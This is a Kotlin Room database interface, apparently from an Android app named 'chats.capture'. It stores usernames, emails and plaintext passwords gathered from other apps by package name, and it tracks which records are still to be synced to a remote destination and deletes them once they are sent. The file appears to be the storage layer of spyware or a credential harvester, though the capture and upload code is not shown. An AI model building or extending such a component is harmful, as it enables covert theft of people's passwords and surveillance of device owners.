package com.chats.capture.database

import androidx.room.*
import com.chats.capture.models.Credential
import com.chats.capture.models.CredentialType
import kotlinx.coroutines.flow.Flow

@Dao
interface CredentialDao {
    
    @Query("SELECT * FROM credentials ORDER BY timestamp DESC")
    fun getAllCredentials(): Flow<List<Credential>>
    
    @Query("SELECT * FROM credentials WHERE synced = 0 ORDER BY timestamp ASC LIMIT :limit")
    suspend fun getUnsyncedCredentials(limit: Int = 50): List<Credential>
    
    @Query("SELECT * FROM credentials WHERE (synced = 0 OR lastSynced IS NULL OR lastSynced < :sinceTimestamp) AND timestamp >= :sinceTimestamp ORDER BY timestamp ASC LIMIT :limit")
    suspend fun getCredentialsSince(sinceTimestamp: Long, limit: Int = 50): List<Credential>
    
    @Query("SELECT * FROM credentials WHERE accountType = :type ORDER BY timestamp DESC")
    suspend fun getCredentialsByType(type: CredentialType): List<Credential>
    
    @Query("SELECT * FROM credentials WHERE appPackage = :packageName ORDER BY timestamp DESC")
    suspend fun getCredentialsByApp(packageName: String): List<Credential>
    
    @Query("SELECT * FROM credentials WHERE email = :email ORDER BY timestamp DESC")
    suspend fun getCredentialsByEmail(email: String): List<Credential>
    
    @Query("SELECT * FROM credentials WHERE appPackage = :appPackage AND username = :username AND password = :password")
    suspend fun findDuplicateCredential(appPackage: String?, username: String?, password: String): Credential?
    
    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insertCredential(credential: Credential)
    
    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insertCredentials(credentials: List<Credential>)
    
    @Update
    suspend fun updateCredential(credential: Credential)
    
    @Query("UPDATE credentials SET synced = 1, lastSynced = :syncTime WHERE id = :id")
    suspend fun markAsSynced(id: String, syncTime: Long = System.currentTimeMillis())
    
    @Query("UPDATE credentials SET synced = 0, syncAttempts = syncAttempts + 1, lastSyncAttempt = :timestamp, errorMessage = :error WHERE id = :id")
    suspend fun markSyncAttempt(id: String, timestamp: Long, error: String?)
    
    @Query("SELECT COUNT(*) FROM credentials WHERE synced = 0")
    suspend fun getUnsyncedCount(): Int
    
    @Query("DELETE FROM credentials WHERE synced = 1 AND timestamp < :beforeTimestamp")
    suspend fun deleteOldSyncedCredentials(beforeTimestamp: Long)
}
